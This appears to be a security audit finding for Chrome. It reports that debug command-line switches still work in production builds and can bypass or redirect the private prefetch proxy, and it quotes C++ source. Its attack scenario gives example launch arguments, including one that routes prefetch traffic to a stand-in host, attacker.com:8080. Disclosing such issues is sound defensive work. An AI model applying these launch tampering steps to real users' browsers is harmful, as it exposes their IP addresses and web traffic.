# Finding 140: Prefetch Proxy Bypass via Command-Line Switches in Production Builds

## Summary
Multiple command-line switches allow bypassing the private prefetch proxy in production Chrome builds. The switches `--bypass-prefetch-proxy-for-host`, `--isolated-prerender-tunnel-proxy`, and `--isolated-prerender-allow-all-domains` are not restricted to debug/test builds. A local attacker who can modify Chrome's launch arguments (e.g., via a malicious shortcut, wrapper script, or compromised launcher) could disable the privacy proxy for prefetching, causing cross-site prefetch requests to be sent directly to target servers rather than through the proxy. This would leak the user's IP address to cross-site prefetch targets.

## Affected Files
- `content/browser/preloading/prefetch/prefetch_params.cc` (lines 24-37) - `PrefetchProxyHost()` with `--isolated-prerender-tunnel-proxy`
- `content/browser/preloading/prefetch/prefetch_params.cc` (lines 45-50) - `PrefetchAllowAllDomains()` with `--isolated-prerender-allow-all-domains`
- `content/browser/preloading/prefetch/prefetch_params.cc` (lines 123-131) - `ShouldPrefetchBypassProxyForTestHost()` with `--bypass-prefetch-proxy-for-host`
- `content/browser/preloading/prefetch/prefetch_document_manager.cc` (lines 51-54) - Proxy bypass in production code paths

## Details
```cpp
// prefetch_params.cc:24-37
GURL PrefetchProxyHost(const GURL& default_proxy_url) {
  // Command line overrides take priority.
  std::string cmd_line_value =
      base::CommandLine::ForCurrentProcess()->GetSwitchValueASCII(
          "isolated-prerender-tunnel-proxy");
  if (!cmd_line_value.empty()) {
    GURL cmd_line_url(cmd_line_value);
    if (cmd_line_url.is_valid()) {
      return cmd_line_url;
    }
    LOG(ERROR) << "--isolated-prerender-tunnel-proxy value is invalid";
  }
  return default_proxy_url;
}
```

```cpp
// prefetch_params.cc:45-50
bool PrefetchAllowAllDomains() {
  return base::GetFieldTrialParamByFeatureAsBool(
             features::kPrefetchUseContentRefactor, "allow_all_domains",
             false) ||
         base::CommandLine::ForCurrentProcess()->HasSwitch(
             "isolated-prerender-allow-all-domains");
}
```

```cpp
// prefetch_params.cc:123-131
bool ShouldPrefetchBypassProxyForTestHost(std::string_view host) {
  static const base::NoDestructor<std::string> bypass(
      base::CommandLine::ForCurrentProcess()->GetSwitchValueASCII(
          "bypass-prefetch-proxy-for-host"));
  if (bypass->empty()) {
    return false;
  }
  return host == *bypass;
}
```

Note that `ShouldPrefetchBypassProxyForTestHost` is called from production code paths (not test-only), specifically from `prefetch_document_manager.cc` and `prefetch_service.cc`.

## Attack Scenario
1. A local attacker modifies Chrome's desktop shortcut to include `--bypass-prefetch-proxy-for-host=*` or `--isolated-prerender-tunnel-proxy=http://attacker.com:8080`
2. When the user launches Chrome, cross-site prefetches bypass the private proxy
3. The user's IP address is exposed to cross-site prefetch target servers
4. Alternatively, with `--isolated-prerender-tunnel-proxy=http://attacker.com:8080`, all prefetch traffic is routed through the attacker's proxy, enabling full request/response inspection

## Impact
Low - Requires local attacker access to modify launch arguments. However, the switches should ideally be restricted to debug builds or require explicit user consent.

## VRP Value
Low
